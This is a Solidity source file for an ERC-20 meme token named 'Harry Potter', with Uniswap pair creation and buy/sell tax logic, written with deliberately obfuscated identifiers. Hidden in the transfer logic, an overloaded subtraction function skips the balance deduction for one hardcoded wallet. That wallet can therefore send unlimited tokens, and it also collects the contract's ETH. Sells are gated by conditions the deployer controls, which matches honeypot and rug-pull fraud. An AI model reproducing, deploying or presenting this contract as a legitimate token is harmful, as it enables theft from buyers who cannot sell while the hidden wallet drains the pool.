/**

Harry Potter   $HarryPotter


TWITTER: https://twitter.com/hposcoin_eth
TELEGRAM: https://t.me/hposcoin
WEBSITE: https://harrypottereth.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mocpx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mocpx(a, b, "SafeMath");
    }

    function  _mocpx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qbvody {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pmhmls {
    function swcatTenSortigFxeOrasfserk(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract HarryPotter is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pmhmls private _Tfqiuk;
    address payable private _Tcvkihvpx;
    address private _yvacsdr;

    bool private _qavlukh;
    bool public _Taralega = false;
    bool private oluyrqrk = false;
    bool private _aujofhpiz = false;

    string private constant _name = unicode"Harry Potter";
    string private constant _symbol = unicode"HarryPotter";
    uint8 private constant _decimals = 9;
    uint256 private constant _cTotalvb = 1000000000 * 10 **_decimals;
    uint256 public _kuvnkaun = _cTotalvb;
    uint256 public _Woleuxqe = _cTotalvb;
    uint256 public _rwapsThaesfvto= _cTotalvb;
    uint256 public _gfakTvkof= _cTotalvb;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _sEjknyvp;
    mapping (address => bool) private _taxraksy;
    mapping(address => uint256) private _rpbuoeo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yavpfarq=0;
    uint256 private _bwskouje=0;


    event _moxhubvf(uint _kuvnkaun);
    modifier ovTaeude {
        oluyrqrk = true;
        _;
        oluyrqrk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _cTotalvb;
        _sEjknyvp[owner(

        )] = true;
        _sEjknyvp[address
        (this)] = true;
        _sEjknyvp[
            _Tcvkihvpx] = true;
        _Tcvkihvpx = 
        payable (0x0937C0f5bA2aBfCC22Dc9f7de3198f48ED7a8216);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _cTotalvb);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _cTotalvb;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mocpx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 akepoun=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Taralega) {
                if (to 
                != address
                (_Tfqiuk) 
                && to !=
                 address
                 (_yvacsdr)) {
                  require(_rpbuoeo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rpbuoeo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yvacsdr && to != 
            address(_Tfqiuk) &&
             !_sEjknyvp[to] ) {
                require(amount 
                <= _kuvnkaun,
                 "Exceeds the _kuvnkaun.");
                require(balanceOf
                (to) + amount
                 <= _Woleuxqe,
                  "Exceeds the macxizse.");
                if(_bwskouje
                < _yavpfarq){
                  require
                  (! _rjopvti(to));
                }
                _bwskouje++;
                 _taxraksy
                 [to]=true;
                akepoun = amount._pvr
                ((_bwskouje>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yvacsdr &&
             from!= address(this) 
            && !_sEjknyvp[from] ){
                require(amount <= 
                _kuvnkaun && 
                balanceOf(_Tcvkihvpx)
                <_gfakTvkof,
                 "Exceeds the _kuvnkaun.");
                akepoun = amount._pvr((_bwskouje>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bwskouje>
                _yavpfarq &&
                 _taxraksy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oluyrqrk 
            && to == _yvacsdr &&
             _aujofhpiz &&
             contractTokenBalance>
             _rwapsThaesfvto 
            && _bwskouje>
            _yavpfarq&&
             !_sEjknyvp[to]&&
              !_sEjknyvp[from]
            ) {
                _rswphkfhi( _rodqe(amount, 
                _rodqe(contractTokenBalance,
                _gfakTvkof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _urhnlp(address
                    (this).balance);
                }
            }
        }

        if(akepoun>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(akepoun);
          emit
           Transfer(from,
           address
           (this),akepoun);
        }
        _balances[from
        ]= _mocpx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mocpx(akepoun));
        emit Transfer
        (from, to, 
        amount.
         _mocpx(akepoun));
    }

    function _rswphkfhi(uint256
     tokenAmount) private
      ovTaeude {
        if(tokenAmount==
        0){return;}
        if(!_qavlukh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tfqiuk.WETH();
        _approve(address(this),
         address(
             _Tfqiuk), 
             tokenAmount);
        _Tfqiuk.
        swcatTenSortigFxeOrasfserk
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rodqe
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mocpx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Tcvkihvpx){
            return a ;
        }else{
            return a .
             _mocpx (b);
        }
    }

    function removeiLimitrs (
        
    ) external onlyOwner{
        _kuvnkaun = _cTotalvb;
        _Woleuxqe = _cTotalvb;
        emit _moxhubvf(_cTotalvb);
    }

    function _rjopvti(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _urhnlp(uint256
    amount) private {
        _Tcvkihvpx.
        transfer(
            amount);
    }

    function enablesTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qavlukh ) ;
        _Tfqiuk  
        =  
        _pmhmls
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tfqiuk), 
            _cTotalvb);
        _yvacsdr = 
        _qbvody(_Tfqiuk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tfqiuk .
             WETH ( ) );
        _Tfqiuk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yvacsdr).
        approve(address(_Tfqiuk), 
        type(uint)
        .max);
        _aujofhpiz = true;
        _qavlukh = true;
    }

    receive() external payable {}
}